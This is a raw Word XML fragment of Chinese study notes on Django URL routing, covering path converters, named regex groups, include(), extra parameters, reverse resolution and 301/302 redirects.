      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>匹配除了</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路径分隔符之外的所有字符串</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6463D9FD"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-int </w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>匹配整数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AEADA7"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-slug </w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>匹配任意的</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>acii</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字符</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加上连字符和下划线</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7948CB56"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-uuid </w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>格式化的</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ID,</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>区分资源取名用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78ADA31E"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-pass</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>匹配任意的非空字符</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38579FEC"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python</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中正则表达式的分组命名</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> (?</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-tag"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;name&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pattern)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149EFB7A"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分组</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以不写，但一般写好，因为多了少了都会报错</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且不写的时候是按顺序匹配的，容易赋值错误</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32222986"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包含其它</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URLconfs  include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639FC7FA"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include</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>截断当前传递剩余到其它地方，参数也会被传递到下一层的每一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C7BAE9"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传递额外参数注意</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205A1E24"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path,re_path</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法中，传递一个</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的字典参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4305F9"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当</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w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>与</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捕获中一致的时候一致的时候，以</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为准</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，当然一般不会把</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捕获和额外参数写成一致</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7248F274"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注意：根目录下传递参数会给下一级别每一个都加上参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738A338A"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-url</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，命名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E82873"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命名可以修改访问路径的时候依然访问到同一个地方</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> reverse </w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>反向解析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40648C3C"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多个应用怕重名需要定义一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>名称</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urlconf</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>下</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> app_name = ''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C64A612"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页面重定向</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C43FD4B"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页面重定向，跳转页面，</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登陆之后，某个操作之后</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 302 redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075910B9"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301 redirect: 301 </w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代表永久性转移</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(Permanently Moved)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE34106"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302 redirect: 302 </w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代表暂时性转移</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(Temporarily Moved )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F428FBE" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="md-end-block"/>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strike/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>虚拟机和物理机外还有一层网络隔离保证不影响，需要通过端口映射来访问，映射到同一个网络层访问</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679162EF" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="C7CBBD"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="714" w:hanging="357"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>实际例子：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8D4EDA" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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Fonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>项目目录文件夹下</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B16EDD7" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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setting</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39AF397B" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D002F8B" wp14:editId="6B2CC2E8">
            <wp:extent cx="4314825" cy="25717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14825" cy="2571750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="123CFE93" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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urls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中指向应用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>urls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FF0D8A" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2F3E2F33" wp14:editId="7FA5872C">
            <wp:extent cx="4648200" cy="17240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48200" cy="1724025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB7538D" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="2B6600"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>一、URL路由映射</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430D420E" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3"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路由映射模块，主要完成</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views</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图函数的映射。当一个</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请求到来时，会按照这个模块中的</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地址从上到下进行匹配，如果匹配成功，将执行映射试图中的函数；反之将返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>404</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EABFA69" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="00843D31">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w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>基本介绍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B27A7D"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urlpatterns = []  </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#里面存放一条条的路由映射关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1812006E"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url(正则表达式, 映射函数，参数[可选]，别名[可选])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A72879" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>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正则匹配中，如果带了括号，那么该括号中的内容会当作参数传递到对应的视图函数中去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C85962" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>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别名，在文件路径发生变化时用处非常大。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391A03FB" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:ind w:firstLine="492"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>配置路由</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">　</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:u w:val="single"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>常规正则匹配</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:u w:val="single"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>路径命名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>别名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361785EE" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>路由应用分发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F79DBD2" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="2B6600"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
